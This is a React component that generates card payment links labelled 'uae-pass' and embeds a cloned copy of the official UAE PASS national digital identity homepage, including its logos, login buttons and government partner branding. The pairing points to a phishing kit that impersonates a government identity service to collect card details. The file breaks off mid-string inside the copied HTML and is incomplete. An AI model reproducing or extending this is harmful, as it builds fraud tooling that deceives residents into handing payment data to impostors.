
import React, { useState } from 'react';
import { useCreateLink } from '@/hooks/useSupabase';
import { OfficialDesignInjector } from '@/components/OfficialDesignInjector';

const UaepassLinkCreator = () => {
  const [amount, setAmount] = useState('');
  const [description, setDescription] = useState('');
  const { createLink, loading, generatedLink } = useCreateLink();

  const handleCreate = async () => {
    await createLink({ 
      amount, 
      description, 
      type: 'card',
      entityId: 'uae-pass'
    });
  };

  const officialHTML = `<div class="uw-sl" role="region" data-uw-rm-ignore="true" data-uw-ignore-translate="true" aria-label="Quick Accessibility Options"><button class="uw-sl__item" data-uw-rm-ignore="true" data-uw-ignore-translate="true" lang="en-US" id="uw-skip-to-main"><span class="uw-sl__item__left" data-uw-ignore-translate="true"><span class="uw-sl__item__img"><svg focusable="false" width="26" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="presentation"><g stroke="#000" stroke-width="1.5" fill="none" fill-rule="evenodd"><rect class="no-fill" fill="none" x=".75" y=".75" width="24.5" height="22.5" rx="3"></rect><path class="no-fill" fill="none" d="M1 7h24M9.5 7v17"></path></g></svg></span><span class="uw-sl__item__title" data-uw-ignore-s17="" data-uw-rm-ignore="true" data-uw-ignore-translate="true">Skip to main content</span></span><span class="uw-sl__e-icon"><svg width="26" height="27" role="presentation" aria-hidden="true" xmlns="http://www.w3.org/2000/svg"><g class="no-fill" fill="none" fill-rule="evenodd"><path d="M4.498 24.3v-.872H1.5v-1.37h2.716v-.872H1.5v-1.27h3v-.872H.542V24.3h3.955zm1.909 0v-3.695L9.183 24.3h.95v-5.256h-.95v3.695l-2.776-3.695H5.45V24.3h.957zm7.21 0v-4.383h1.682v-.873h-4.314v.873h1.683V24.3h.948zm6.421 0v-.872H17.04v-1.37h2.716v-.872H17.04v-1.27h3v-.872h-3.956V24.3h3.955zm1.84 0v-1.767h1.017l1.24 1.767h1.086l-1.316-1.867c.757-.237 1.27-.849 1.27-1.644 0-1.025-.842-1.745-1.966-1.745H20.92V24.3h.957zm1.224-2.647h-1.224v-1.729h1.224c.65 0 1.101.33 1.101.865 0 .535-.451.864-1.101.864z" fill="#000" fill-rule="nonzero"></path><path class="no-fill" fill="none" d="M18.9 1v6.3a2.7 2.7 0 01-2.7 2.7H5.4h0" stroke="#000" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path><path fill="none" stroke="#000" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" d="M8.1 12.7L5.4 10l2.7-2.7"></path></g></svg></span></button><button class="uw-sl__item" data-uw-rm-ignore="true" data-uw-ignore-translate="true" lang="en-US" id="uw-enable-visibility"><span class="uw-sl__item__left" data-uw-ignore-translate="true"><span class="uw-sl__item__img"><svg focusable="false" width="28" height="26" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="presentation"><g class="no-fill" fill="none" fill-rule="evenodd"><path d="M13.808 6.019C8.625 6.019 4.01 9.197 1 14.148c3.01 4.951 7.625 8.129 12.808 8.129s9.797-3.178 12.807-8.129c-3.01-4.951-7.624-8.13-12.807-8.13" stroke="#000" class="no-fill" stroke-width="1.5" fill="none"></path><path d="M13.813 11.124c1.704 0 3.086 1.368 3.086 3.055 0 1.688-1.382 3.055-3.086 3.055s-3.086-1.367-3.086-3.055c0-1.687 1.382-3.055 3.086-3.055m0-3.055c-3.408 0-6.172 2.735-6.172 6.11 0 3.375 2.764 6.11 6.172 6.11s6.172-2.735 6.172-6.11c0-3.375-2.764-6.11-6.172-6.11" class="fill-white" fill="#FFF" fill-rule="nonzero"></path><path d="M17.913 14.18c0 2.244-1.839 4.064-4.105 4.064-2.268 0-4.106-1.82-4.106-4.065s1.838-4.064 4.106-4.064c2.266 0 4.105 1.82 4.105 4.064" stroke="#000" stroke-width="1.5" class="no-fill" fill="none"></path><path class="no-fill" stroke="#FFF" stroke-width="3" stroke-linecap="round" d="M2.872 22.306L22.03 3.339" fill="none"></path><path stroke="#000" stroke-width="1.5" stroke-linecap="round" d="M4.24 23.661L23.398 4.694" class="no-fill" fill="none"></path></g></svg></span><span class="uw-sl__item__title" data-uw-ignore-s17="" data-uw-rm-ignore="true" data-uw-ignore-translate="true">Enable accessibility for low vision</span></span><span class="uw-sl__e-icon"><svg width="26" height="27" role="presentation" aria-hidden="true" xmlns="http://www.w3.org/2000/svg"><g class="no-fill" fill="none" fill-rule="evenodd"><path d="M4.498 24.3v-.872H1.5v-1.37h2.716v-.872H1.5v-1.27h3v-.872H.542V24.3h3.955zm1.909 0v-3.695L9.183 24.3h.95v-5.256h-.95v3.695l-2.776-3.695H5.45V24.3h.957zm7.21 0v-4.383h1.682v-.873h-4.314v.873h1.683V24.3h.948zm6.421 0v-.872H17.04v-1.37h2.716v-.872H17.04v-1.27h3v-.872h-3.956V24.3h3.955zm1.84 0v-1.767h1.017l1.24 1.767h1.086l-1.316-1.867c.757-.237 1.27-.849 1.27-1.644 0-1.025-.842-1.745-1.966-1.745H20.92V24.3h.957zm1.224-2.647h-1.224v-1.729h1.224c.65 0 1.101.33 1.101.865 0 .535-.451.864-1.101.864z" fill="#000" fill-rule="nonzero"></path><path class="no-fill" fill="none" d="M18.9 1v6.3a2.7 2.7 0 01-2.7 2.7H5.4h0" stroke="#000" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path><path fill="none" stroke="#000" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" d="M8.1 12.7L5.4 10l2.7-2.7"></path></g></svg></span></button><button class="uw-sl__item" data-uw-rm-ignore="true" data-uw-ignore-translate="true" lang="en-US" id="uw-open-accessibility"><span class="uw-sl__item__left" data-uw-ignore-translate="true"><span class="uw-sl__item__img"><svg focusable="false" width="23" height="28" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="presentation"><path d="M.018 8.639c.105-.595.65-.991 1.223-.877a53.94 53.94 0 0020.517 0c.625-.125 1.228.366 1.242 1.06.01.544-.402 1.003-.915 1.102-2.289.44-4.589.727-6.893.877-.948.063-1.647.948-1.54 1.932l.202 1.84c.314 2.87.958 5.69 1.919 8.399l1.26 3.553c.202.568-.076 1.197-.62 1.407a.994.994 0 01-.364.068c-.4 0-.768-.245-.944-.638l-.007.007-.325-.724a110.53 110.53 0 01-2.83-6.926.462.462 0 00-.878 0 105.146 105.146 0 01-2.832 6.917l-.308.68.005-.021a1.05 1.05 0 01-.98.705.994.994 0 01-.364-.068c-.544-.21-.821-.839-.62-1.407l1.26-3.553a37.235 37.235 0 001.92-8.403l.2-1.824c.107-.986-.59-1.881-1.54-1.943A55.94 55.94 0 01.86 9.914c-.57-.11-.947-.68-.841-1.275zM11.5 0c1.934 0 3.502 1.634 3.502 3.651 0 2.016-1.568 3.65-3.502 3.65-1.934 0-3.502-1.634-3.502-3.65C7.998 1.634 9.566 0 11.5 0z" fill="#000" fill-rule="evenodd"></path></svg></span><span class="uw-sl__item__title" data-uw-ignore-s17="" data-uw-rm-ignore="true" data-uw-ignore-translate="true">Open the accessibility menu</span></span><span class="uw-sl__e-icon"><svg width="26" height="27" role="presentation" aria-hidden="true" xmlns="http://www.w3.org/2000/svg"><g class="no-fill" fill="none" fill-rule="evenodd"><path d="M4.498 24.3v-.872H1.5v-1.37h2.716v-.872H1.5v-1.27h3v-.872H.542V24.3h3.955zm1.909 0v-3.695L9.183 24.3h.95v-5.256h-.95v3.695l-2.776-3.695H5.45V24.3h.957zm7.21 0v-4.383h1.682v-.873h-4.314v.873h1.683V24.3h.948zm6.421 0v-.872H17.04v-1.37h2.716v-.872H17.04v-1.27h3v-.872h-3.956V24.3h3.955zm1.84 0v-1.767h1.017l1.24 1.767h1.086l-1.316-1.867c.757-.237 1.27-.849 1.27-1.644 0-1.025-.842-1.745-1.966-1.745H20.92V24.3h.957zm1.224-2.647h-1.224v-1.729h1.224c.65 0 1.101.33 1.101.865 0 .535-.451.864-1.101.864z" fill="#000" fill-rule="nonzero"></path><path class="no-fill" fill="none" d="M18.9 1v6.3a2.7 2.7 0 01-2.7 2.7H5.4h0" stroke="#000" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path><path fill="none" stroke="#000" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" d="M8.1 12.7L5.4 10l2.7-2.7"></path></g></svg></span></button></div><div class="uwy userway_p1" data-uw-feature-ignore="true" data-uw-rm-ignore="true" title="Accessibility Menu" style="background-color: transparent !important; overflow: initial !important;"><div class="userway_buttons_wrapper"><div class="ulsti hidden userway_dark" id="userwayLstIcon" aria-label="Translations Menu" role="button" tabindex="0" aria-haspopup="dialog" data-uw-s19-ignore="" title="Translations Menu" style="background: rgb(17, 165, 111) !important;"><span class="uiiw"></span><div class="ups"><img width="43" height="43" data-uw-rm-ignore="" class="si_w" aria-hidden="true" alt="Spinner: White decorative" src="https://cdn.userway.org/widgetapp/images/spin_wh.svg"></div><span class="usr lst-spacer"></span></div><div class="uai userway_dark" id="userwayAccessibilityIcon" aria-label="Accessibility Menu" role="button" tabindex="0" aria-haspopup="dialog" title="Accessibility Menu" style="background: rgb(17, 165, 111) !important;"><span class="uiiw"><img data-uw-rm-ignore="" class="ui_w" role="presentation" alt="" src="https://cdn.userway.org/widgetapp/images/body_wh.svg"></span><div class="ups"><img width="43" height="43" data-uw-rm-ignore="" class="si_w" aria-hidden="true" alt="Spinner: White decorative" src="https://cdn.userway.org/widgetapp/images/spin_wh.svg"></div><span class="usr"></span></div><div class="uwaw-dictionary-tooltip"></div></div><iframe class="uwif userway_p1" data-uw-ignore-translate="true" name="userway" title="UserWay Accessibility Menu" allow="clipboard-write" style="max-width: 100vw !important; visibility: visible !important; opacity: 1 !important; color-scheme: light !important;"></iframe></div><div class="uw-s10-bottom-ruler-guide"></div><div class="uw-s10-right-ruler-guide"></div><div class="uw-s10-left-ruler-guide"></div><div class="uw-s10-reading-guide"><div class="uw-s10-reading-guide__arrow"></div></div><div class="uw-s12-tooltip" aria-hidden="true"></div><div id="__nuxt" data-v-app=""><div><div data-v-1f289850="" class="v-application v-theme--uaepassDefaultTheme v-layout v-layout--full-height v-locale--is-ltr bg-white accessibility-btn-hidden"><div class="v-application__wrap"><main class="v-main" style="--v-layout-left: 0px; --v-layout-right: 0px; --v-layout-top: 0px; --v-layout-bottom: 0px;"><div data-v-1f289850="" class="banner__wrapper"><div data-v-1f289850="" class="banner__images-color"></div><div data-v-c466635d="" class="header bg-color-transparent header--transparent"><div data-v-4ca7063c="" data-v-c466635d="" class="d-none d-sm-flex justify-space-between transparent"><div data-v-4ca7063c="" class="d-flex" gap="36"><a data-v-4ca7063c="" aria-label="Home" tabindex="0" class="link link--active cursor-pointer" style="display: none;">Home</a><a data-v-4ca7063c="" aria-label="See Kiosk Locations" tabindex="0" class="link ms-md-8 ms-4 cursor-pointer" style="display: none;">Kiosk Locations</a><a data-v-4ca7063c="" aria-label="See our partners" tabindex="0" class="link ms-md-8 ms-4 cursor-pointer" style="display: none;">Partners</a><a data-v-4ca7063c="" aria-label="Developers" tabindex="0" class="link ms-md-8 ms-4 cursor-pointer" style="display: none;">Developers</a><a data-v-4ca7063c="" aria-label="About Us" tabindex="0" class="link cursor-pointer">About</a><a data-v-4ca7063c="" aria-label="Frequently Asked Questions" tabindex="0" class="link ms-9 cursor-pointer">FAQs</a><a data-v-4ca7063c="" aria-label="Tutorials" tabindex="0" class="link ms-9 cursor-pointer">Tutorials</a><a data-v-4ca7063c="" aria-label="Ask for support" tabindex="0" class="link ms-9 cursor-pointer">Support</a></div><div data-v-4ca7063c="" class="d-flex justify-space-between align-center"><button data-v-4ca7063c="" type="button" class="v-btn v-btn--elevated v-btn--icon v-theme--uaepassDefaultTheme bg-white v-btn--density-compact v-btn--variant-elevated mx-1 uaepass-accessibility mx-1 uaepass-accessibility" id="uaepass-accessibility-trigger" data-testid="accessibility-btn" aria-label="button" data-uw-rm-empty-ctrl="" style="width: 30px; height: 30px;"><span class="v-btn__overlay"></span><span class="v-btn__underlay"></span><!----><span class="v-btn__content" data-no-activator=""><i data-v-4ca7063c="" class="uaepass-accessiblity mdi v-icon notranslate v-theme--uaepassDefaultTheme" aria-hidden="true" alt="weelchair" style="font-size: 30px; height: 30px; width: 30px;"></i></span><!----><!----></button><button data-v-4ca7063c="" type="button" class="v-btn v-btn--elevated v-btn--icon v-theme--uaepassDefaultTheme bg-white v-btn--density-compact v-btn--variant-elevated" data-testid="lang-btn" text-content="earth" name="earth" aria-label="change language"><span class="v-btn__overlay"></span><span class="v-btn__underlay"></span><!----><span class="v-btn__content" data-no-activator=""><i data-v-4ca7063c="" class="mdi-web mdi v-icon notranslate v-theme--uaepassDefaultTheme v-icon--size-default" aria-hidden="true"></i></span><!----><!----></button></div></div><hr data-v-c466635d="" class="v-divider v-theme--uaepassDefaultTheme d-sm-block d-none transparent" aria-orientation="horizontal" role="separator"><div data-v-d48313e8="" data-v-c466635d="" class="d-flex justify-space-between align-center"><a data-v-d48313e8="" href="/" aria-label="Home"><div data-v-d48313e8="" class="v-responsive v-img white-logo" aria-label="UAE Pass logo" role="img" style="height: 40px; width: 135px;"><div class="v-responsive__sizer" style="padding-bottom: 29.8246%;"></div><img class="v-img__img v-img__img--contain" src="/images/full-logo.svg" alt="UAE Pass logo" style=""><!----><!----><!----><!----><!----></div></a><div data-v-d48313e8="" class="d-sm-flex d-none transparent"><a data-v-d48313e8="" class="link link--active cursor-pointer" aria-label="Home" custom-title="Home" tabindex="0">Home <div data-v-d48313e8="" class="link__border mt-2"></div></a><a data-v-d48313e8="" class="link ms-md-8 ms-4 cursor-pointer" aria-label="See Kiosk Locations" custom-title="Kiosk Locations" tabindex="0">Kiosk Locations <div data-v-d48313e8="" class="link__border mt-2"></div></a><a data-v-d48313e8="" class="link ms-md-8 ms-4 cursor-pointer" aria-label="See our partners" custom-title="Partners" tabindex="0">Partners <div data-v-d48313e8="" class="link__border mt-2"></div></a><a data-v-d48313e8="" class="link ms-md-8 ms-4 cursor-pointer" aria-label="Developers" custom-title="Developers" tabindex="0">Developers <div data-v-d48313e8="" class="link__border mt-2"></div></a><a data-v-d48313e8="" class="link cursor-pointer" aria-label="About Us" custom-title="About" tabindex="0" style="display: none;">About <div data-v-d48313e8="" class="link__border mt-2"></div></a><a data-v-d48313e8="" class="link ms-9 cursor-pointer" aria-label="Frequently Asked Questions" custom-title="FAQs" tabindex="0" style="display: none;">FAQs <div data-v-d48313e8="" class="link__border mt-2"></div></a><a data-v-d48313e8="" class="link ms-9 cursor-pointer" aria-label="Tutorials" custom-title="Tutorials" tabindex="0" style="display: none;">Tutorials <div data-v-d48313e8="" class="link__border mt-2"></div></a><a data-v-d48313e8="" class="link ms-9 cursor-pointer" aria-label="Ask for support" custom-title="Support" tabindex="0" style="display: none;">Support <div data-v-d48313e8="" class="link__border mt-2"></div></a></div><div data-v-d48313e8="" class="d-flex align-center"><button data-v-d48313e8="" type="button" class="v-btn v-btn--elevated v-btn--icon v-theme--uaepassDefaultTheme v-btn--density-compact v-btn--variant-elevated mx-1 uaepass-accessibility" id="uaepass-accessibility-trigger" data-test="accessibility-btn" aria-label="button" data-uw-rm-empty-ctrl="" style="background-color: rgb(64, 73, 67); color: rgb(255, 255, 255); caret-color: rgb(255, 255, 255); width: 30px; height: 30px; display: none;"><span class="v-btn__overlay"></span><span class="v-btn__underlay"></span><!----><span class="v-btn__content" data-no-activator=""><i data-v-d48313e8="" class="uaepass-accessiblity mdi v-icon notranslate v-theme--uaepassDefaultTheme" aria-hidden="true" alt="weelchair" style="font-size: 30px; height: 30px; width: 30px;"></i></span><!----><!----></button><i data-v-d48313e8="" class="mdi-menu mdi v-icon notranslate v-theme--uaepassDefaultTheme v-icon--size-default text-white v-icon--clickable d-sm-none mx-2" role="button" aria-hidden="false" tabindex="0" aria-label="button" data-uw-rm-empty-ctrl=""></i><button data-v-d48313e8="" type="button" class="v-btn v-theme--uaepassDefaultTheme v-btn--density-default v-btn--size-default v-btn--variant-tonal d-none d-sm-flex px-8 login-btn" data-test="login-button"><span class="v-btn__overlay"></span><span class="v-btn__underlay"></span><!----><span class="v-btn__content" data-no-activator="">Login</span><!----><!----></button></div></div></div><div data-v-6ca6b6e6="" data-v-c466635d="" class="mobile-header d-sm-none mobile-header--transparent"><div data-v-d48313e8="" data-v-6ca6b6e6="" class="d-flex justify-space-between align-center"><a data-v-d48313e8="" href="/" aria-label="Home"><div data-v-d48313e8="" class="v-responsive v-img v-img--booting white-logo" aria-label="UAE Pass logo" role="img" style="height: 40px; width: 135px;"><div class="v-responsive__sizer"></div><!----><!----><!----><!----><!----><!----></div></a><div data-v-d48313e8="" class="d-sm-flex d-none transparent"><a data-v-d48313e8="" class="link link--active cursor-pointer" aria-label="Home" custom-title="Home" tabindex="0">Home <div data-v-d48313e8="" class="link__border mt-2"></div></a><a data-v-d48313e8="" class="link ms-md-8 ms-4 cursor-pointer" aria-label="See Kiosk Locations" custom-title="Kiosk Locations" tabindex="0">Kiosk Locations <div data-v-d48313e8="" class="link__border mt-2"></div></a><a data-v-d48313e8="" class="link ms-md-8 ms-4 cursor-pointer" aria-label="See our partners" custom-title="Partners" tabindex="0">Partners <div data-v-d48313e8="" class="link__border mt-2"></div></a><a data-v-d48313e8="" class="link ms-md-8 ms-4 cursor-pointer" aria-label="Developers" custom-title="Developers" tabindex="0">Developers <div data-v-d48313e8="" class="link__border mt-2"></div></a><a data-v-d48313e8="" class="link cursor-pointer" aria-label="About Us" custom-title="About" tabindex="0" style="display: none;">About <div data-v-d48313e8="" class="link__border mt-2"></div></a><a data-v-d48313e8="" class="link ms-9 cursor-pointer" aria-label="Frequently Asked Questions" custom-title="FAQs" tabindex="0" style="display: none;">FAQs <div data-v-d48313e8="" class="link__border mt-2"></div></a><a data-v-d48313e8="" class="link ms-9 cursor-pointer" aria-label="Tutorials" custom-title="Tutorials" tabindex="0" style="display: none;">Tutorials <div data-v-d48313e8="" class="link__border mt-2"></div></a><a data-v-d48313e8="" class="link ms-9 cursor-pointer" aria-label="Ask for support" custom-title="Support" tabindex="0" style="display: none;">Support <div data-v-d48313e8="" class="link__border mt-2"></div></a></div><div data-v-d48313e8="" class="d-flex align-center"><button data-v-d48313e8="" type="button" class="v-btn v-btn--elevated v-btn--icon v-theme--uaepassDefaultTheme v-btn--density-compact v-btn--variant-elevated mx-1 uaepass-accessibility" id="uaepass-accessibility-trigger" data-test="accessibility-btn" aria-label="button" data-uw-rm-empty-ctrl="" style="background-color: rgb(64, 73, 67); color: rgb(255, 255, 255); caret-color: rgb(255, 255, 255); width: 30px; height: 30px; display: none;"><span class="v-btn__overlay"></span><span class="v-btn__underlay"></span><!----><span class="v-btn__content" data-no-activator=""><i data-v-d48313e8="" class="uaepass-accessiblity mdi v-icon notranslate v-theme--uaepassDefaultTheme" aria-hidden="true" alt="weelchair" style="font-size: 30px; height: 30px; width: 30px;"></i></span><!----><!----></button><i data-v-d48313e8="" class="mdi-menu mdi v-icon notranslate v-theme--uaepassDefaultTheme v-icon--size-default text-white v-icon--clickable d-sm-none mx-2" role="button" aria-hidden="false" tabindex="0" aria-label="button" data-uw-rm-empty-ctrl=""></i><button data-v-d48313e8="" type="button" class="v-btn v-theme--uaepassDefaultTheme v-btn--density-default v-btn--size-default v-btn--variant-tonal d-none d-sm-flex px-8 login-btn" data-test="login-button" aria-label="Login" data-uw-rm-empty-ctrl=""><span class="v-btn__overlay"></span><span class="v-btn__underlay"></span><!----><span class="v-btn__content" data-no-activator="">Login</span><!----><!----></button></div></div><div data-v-6ca6b6e6="" class="position-relative d-flex flex-column justify-space-between h-100"><div data-v-6ca6b6e6="" class="d-flex flex-column"><a data-v-6ca6b6e6="" aria-label="Home" class="mobile-header__nav cursor-pointer" tabindex="0">Home</a><a data-v-6ca6b6e6="" aria-label="See Kiosk Locations" class="mobile-header__nav cursor-pointer" tabindex="0">Kiosk Locations</a><a data-v-6ca6b6e6="" aria-label="See our partners" class="mobile-header__nav cursor-pointer" tabindex="0">Partners</a><a data-v-6ca6b6e6="" aria-label="Developers" class="mobile-header__nav cursor-pointer" tabindex="0">Developers</a><a data-v-6ca6b6e6="" aria-label="About Us" class="mobile-header__nav cursor-pointer" tabindex="0">About</a><a data-v-6ca6b6e6="" aria-label="Frequently Asked Questions" class="mobile-header__nav cursor-pointer" tabindex="0">FAQs</a><a data-v-6ca6b6e6="" aria-label="Tutorials" class="mobile-header__nav cursor-pointer" tabindex="0">Tutorials</a><a data-v-6ca6b6e6="" aria-label="Ask for support" class="mobile-header__nav cursor-pointer" tabindex="0">Support</a><a data-v-6ca6b6e6="" href="#" class="mobile-header__nav" aria-label="change language" tabindex="0"><i data-v-6ca6b6e6="" class="mdi-web mdi v-icon notranslate v-theme--uaepassDefaultTheme v-icon--size-default text-white me-2" aria-hidden="true"></i> Language</a></div><button data-v-6ca6b6e6="" type="button" class="v-btn v-theme--uaepassDefaultTheme v-btn--density-default v-btn--size-default v-btn--variant-flat mobile-header__login" aria-label="Login" data-uw-rm-empty-ctrl=""><span class="v-btn__overlay"></span><span class="v-btn__underlay"></span><!----><span class="v-btn__content" data-no-activator="">Login</span><!----><!----></button></div></div><div data-v-f1abacc5="" data-v-1f289850="" class="banner full__width-container d-flex flex-md-row flex-column-reverse position-relative text-color-on-primary"><div data-v-f1abacc5="" class="banner__content d-flex flex-column"><h1 data-v-f1abacc5="" class="text-sm-h3 text-h4 font-weight-bold" data-uw-rm-heading="prs">UAE PASS</h1><h5 data-v-f1abacc5="" class="text-sm-h5 text-subtitle-1 font-weight-600 mt-1" role="heading" aria-level="2" data-uw-rm-heading="level">The first national digital identity for citizens residents and visitors in UAE</h5><p data-v-f1abacc5="" class="text-sm-body-1 text-body-2 mt-lg-6 mt-2 mb-lg-8 mb-sm-6 mb-4">UAE PASS is the first secure national digital identity for citizens, residents and visitors in UAE, enabling them to access many online services across various sectors, in addition to providing features such as signing and verifying documents digitally, requesting digital versions of official documents, and using the same in applying for services from our partners.</p><div data-v-3583ee88="" data-v-f1abacc5="" class="actions d-flex flex-sm-nowrap flex-wrap justify-sm-start justify-center mb-lg-16 mb-8"><button data-v-3583ee88="" type="button" class="v-btn v-theme--uaepassDefaultTheme v-btn--density-default v-btn--size-default v-btn--variant-tonal me-lg-4 me-2 mt-sm-0 mt-2" data-test="sign-button"><span class="v-btn__overlay"></span><span class="v-btn__underlay"></span><!----><span class="v-btn__content" data-no-activator=""><i class="uaepass-pencil-outline mdi v-icon notranslate v-theme--uaepassDefaultTheme v-icon--size-default text-white me-2" aria-hidden="true"></i><span class="font-weight-600 letter-spacing-0">Sign Document</span></span><!----><!----></button><input data-v-92d5a344="" type="file" name="upload" hidden="" accept="application/pdf" aria-label="upload file"><button data-v-92d5a344="" type="button" class="v-btn v-theme--uaepassDefaultTheme v-btn--density-default v-btn--size-default v-btn--variant-tonal me-lg-4 me-2 mt-sm-0 mt-2 verify__btn"><span class="v-btn__overlay"></span><span class="v-btn__underlay"></span><!----><span class="v-btn__content" data-no-activator=""><i data-v-92d5a344="" class="mdi-check-decagram-outline mdi v-icon notranslate v-theme--uaepassDefaultTheme v-icon--size-default text-white me-2" aria-hidden="true"></i><span data-v-92d5a344="" class="font-weight-600 letter-spacing-0">Verify Document</span></span><!----><!----></button><!----><!----><!----><!----><!----><!----><button data-v-3583ee88="" type="button" class="v-btn v-theme--uaepassDefaultTheme v-btn--density-default v-btn--size-default v-btn--variant-text mt-sm-0 mt-2"><span class="v-btn__overlay"></span><span class="v-btn__underlay"></span><!----><span class="v-btn__content" data-no-activator=""><i data-v-3583ee88="" class="mdi-play-circle-outline mdi v-icon notranslate v-theme--uaepassDefaultTheme v-icon--size-default text-white me-2" aria-hidden="true"></i><span data-v-3583ee88="" class="font-weight-600 letter-spacing-0">Watch Video</span></span><!----><!----></button></div><div data-v-bcd69873="" data-v-f1abacc5="" class="logo mt-md-4 mt-0 d-sm-block d-flex flex-column align-center"><p data-v-bcd69873="" class="text-body-2">In Collaboration With</p><div data-v-bcd69873="" class="d-flex flex-sm-row flex-column align-center mt-4 collaborators__images ga-8"><div data-v-bcd69873="" class="v-responsive v-img logo__dda" aria-label="Digital Dubai logo" role="img" style="width: 81px;"><div class="v-responsive__sizer" style="padding-bottom: 38.2716%;"></div><img class="v-img__img v-img__img--contain" src="/images/logos/dda.svg" alt="Digital Dubai logo" style=""><!----><!----><!----><!----><!----></div><div data-v-bcd69873="" class="v-responsive v-img logo__tdra" aria-label="TDRA logo" role="img" style="width: 195px;"><div class="v-responsive__sizer" style="padding-bottom: 10.3734%;"></div><img class="v-img__img v-img__img--contain" src="/images/logos/tdra.svg" alt="TDRA logo" style=""><!----><!----><!----><!----><!----></div><div data-v-bcd69873="" class="v-responsive v-img logo__adda" aria-label="Adda logo" role="img" style="width: 241px;"><div class="v-responsive__sizer" style="padding-bottom: 24.1026%;"></div><img class="v-img__img v-img__img--contain" src="/images/logos/adda.svg" alt="Adda logo" style=""><!----><!----><!----><!----><!----></div></div></div></div><div data-v-f1abacc5="" class="banner__images d-flex justify-center"><div data-v-f1abacc5="" class="v-responsive v-img banner__mobile" aria-label="mobile uaepass image" role="img"><div class="v-responsive__sizer" style="padding-bottom: 169.355%;"></div><img class="v-img__img v-img__img--contain" src="/images/u-pass-mobile.png" alt="mobile uaepass image" style=""><!----><!----><!----><!----><!----></div><div data-v-f1abacc5="" class="banner__qr-wrapper"><div data-v-f1abacc5="" class="v-responsive v-img banner__qr" aria-label="qr code image" role="img"><div class="v-responsive__sizer" style="padding-bottom: 100%;"></div><img class="v-img__img v-img__img--contain" src="/images/qr-code.png" alt="qr code image" style=""><!----><!----><!----><!----><!----></div><p data-v-f1abacc5="" class="text-sm-h5 text-overline font-weight-thin mt-sm-4 mt-2 banner__line-height">Download</p><p data-v-f1abacc5="" class="text-sm-h5 text-overline font-weight-bold banner__line-height">UAE PASS</p></div></div></div></div><div data-v-1f289850="" class="v-sheet v-theme--uaepassDefaultTheme" aria-haspopup="dialog"><div data-v-0f365038="" class="convenience__wrapper"><div data-v-0f365038="" class="full__width-container"><div data-v-0f365038="" class="py-sm-16 py-8"><h2 data-v-0f365038="" class="text-sm-h4 text-h5 font-weight-bold" data-uw-rm-heading="prs">UAE PASS is your right choice</h2><p data-v-0f365038="" class="text-body-1 text-color-gray-50 mt-4">The first national digital identity for citizens, residents, and visitors in UAE.</p><div data-v-0f365038="" class="d-flex flex-md-row flex-column justify-space-between mt-md-12 mt-0 convenience__tips-container"><div data-v-99e549d0="" data-v-0f365038="" class="flex-1 tips__item-container"><div data-v-99e549d0="" class="d-flex flex-column mt-md-0 mt-10 tips__item"><i data-v-99e549d0="" class="mdi-shield-lock-outline mdi v-icon notranslate v-theme--uaepassDefaultTheme" aria-hidden="true" style="font-size: 40px; height: 40px; width: 40px; color: rgb(170, 143, 0); caret-color: rgb(170, 143, 0);"></i><p data-v-99e549d0="" class="text-sm-h5 text-h6 font-weight-600 text-color-gray-70 mt-5">Secure Sign In</p><p data-v-99e549d0="" class="tips__desc mt-3">Login and sign up to many websites and applications with one account</p><a data-v-99e549d0="" class="mt-4 text-subtitle-1 font-weight-medium text-decoration-none text-color-primary-60 cursor-pointer" tabindex="0">Learn More <i data-v-99e549d0="" class="mdi-arrow-right-thin mdi v-icon notranslate v-theme--uaepassDefaultTheme" aria-hidden="true" style="font-size: 20px; height: 20px; width: 20px;"></i></a></div></div><div data-v-99e549d0="" data-v-0f365038="" class="flex-1 tips__item-container"><div data-v-99e549d0="" class="d-flex flex-column mt-md-0 mt-10 tips__item"><i data-v-99e549d0="" class="uaepass-pencil-outline mdi v-icon notranslate v-theme--uaepassDefaultTheme" aria-hidden="true" style="font-size: 40px; height: 40px; width: 40px; color: rgb(170, 143, 0); caret-color: rgb(170, 143, 0);"></i><p data-v-99e549d0="" class="text-sm-h5 text-h6 font-weight-600 text-color-gray-70 mt-5">Sign Documents Digitally</p><p data-v-99e549d0="" class="tips__desc mt-3">Sign and verify documents digitally.</p><a data-v-99e549d0="" class="mt-4 text-subtitle-1 font-weight-medium text-decoration-none text-color-primary-60 cursor-pointer" tabindex="0">Learn More <i data-v-99e549d0="" class="mdi-arrow-right-thin mdi v-icon notranslate v-theme--uaepassDefaultTheme" aria-hidden="true" style="font-size: 20px; height: 20px; width: 20px;"></i></a></div></div><div data-v-99e549d0="" data-v-0f365038="" class="flex-1 tips__item-container"><div data-v-99e549d0="" class="d-flex flex-column mt-md-0 mt-10 tips__item"><i data-v-99e549d0="" class="uaepass-doc-badge mdi v-icon notranslate v-theme--uaepassDefaultTheme" aria-hidden="true" style="font-size: 40px; height: 40px; width: 40px; color: rgb(170, 143, 0); caret-color: rgb(170, 143, 0);"></i><p data-v-99e549d0="" class="text-sm-h5 text-h6 font-weight-600 text-color-gray-70 mt-5">Documents Sharing</p><p data-v-99e549d0="" class="tips__desc mt-3">Request and share official documents with various partners</p><a data-v-99e549d0="" class="mt-4 text-subtitle-1 font-weight-medium text-decoration-none text-color-primary-60 cursor-pointer" tabindex="0">Learn More <i data-v-99e549d0="" class="mdi-arrow-right-thin mdi v-icon notranslate v-theme--uaepassDefaultTheme" aria-hidden="true" style="font-size: 20px; height: 20px; width: 20px;"></i></a></div></div></div></div></div></div><div data-v-0f365038="" class="full__width-container py-sm-16 py-8"><div data-v-6592a0cb="" id="secureSignIn" class="d-flex justify-space-between tip mt-8 flex-row flex-column-reverse flex-sm-row"><div data-v-6592a0cb="" class="tip__text d-flex flex-column justify-center"><p data-v-6592a0cb="" class="tip__phone text-color-secondary-secondary font-weight-600 text-body-2 mb-2">THROUGH YOUR SMARTPHONE</p><h2 data-v-6592a0cb="" class="tip__heading mb-4 text-color-gray-70 font-weight-600" data-uw-rm-heading="prs">Login and sign up to many websites and applications with one account</h2><p data-v-6592a0cb="" class="tip__desc text-color-gray-50 